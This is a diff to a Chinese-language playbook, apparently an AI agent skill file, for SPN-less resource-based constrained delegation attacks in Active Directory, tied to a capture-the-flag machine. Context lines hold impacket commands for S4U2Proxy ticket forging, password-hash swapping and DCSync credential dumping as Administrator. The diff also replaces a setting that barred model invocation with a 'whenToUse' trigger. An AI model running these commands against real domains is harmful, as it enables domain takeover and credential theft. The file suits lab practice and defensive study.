@@ -1,7 +1,7 @@
 ---
 name: 'rbcd-spnless'
-description: 'SPN-less RBCD：发起账户无 SPN 时 getST -u2u S4U2Proxy BADOPTION 的标准解法（changepasswd -newhashes 改 NT hash = TGT session key）'
-disable-model-invocation: true
+description: 'SPN-less RBCD：发起账户无 SPN 时 getST -u2u S4U2Proxy BADOPTION 的标准解法（changepasswd -newhashes 改 NT hash = TGT session key）（检索词：rbcd spnless）'
+whenToUse: 'RBCD 发起账户无 SPN、getST -u2u 的 S4U2Proxy 报 KDC_ERR_BADOPTION 时使用。'
 metadata: { domain: ad-win, tier: T2 }
 ---
 
@@ -35,7 +35,7 @@ impacket-getST -additional-ticket 'Administrator@ACCT$@DOM.ccache' \
 # 6. 立即恢复密码/hash
 KRB5CCNAME=ACCT$.ccache impacket-changepasswd 'dom/ACCT$@DC.dom' \
   -newhashes :<OLDHASH> -hashes :<SKEY> -k -no-pass -dc-ip <DC>
-```text
+```
 
 ## 利用 TGS
 ```bash
@@ -44,7 +44,7 @@ impacket-secretsdump -k -no-pass 'dom/Administrator@dc.dom' -dc-ip <DC>   # DCSy
 # 读 flag：impacket-smbclient -k -no-pass 'dom/Administrator@dc.dom' -inputfile cmds.txt
 #   cmds: use C$ / cd Users\Admin\Desktop / get root.txt（get 不能带本地路径参数！）
 # psexec -k 可用但 stdout 不回显；wmiexec 需 HOST SPN
-```text
+```
 
 ## ⚠️ 坑
 - **NTLM 禁用环境**：changepasswd/getST 全部 `-k`（Kerberos）
@@ -58,4 +58,4 @@ impacket-secretsdump -k -no-pass 'dom/Administrator@dc.dom' -dc-ip <DC>   # DCSy
 - HackTricks: resource-based-constrained-delegation（"Authenticate with NT hash... changepasswd.py -newhashes"）
 - NetExec Wiki delegation: `nxc smb DC --use-kcache --delegate Administrator --u2u`
 - Medium "A Practical Guide to RBCD Exploitation"（U2U ticket 加密机制）
-- 关联: Hercules 靶机复盘记录
+- 关联: Hercules 靶机复盘记录（hercules-progress）
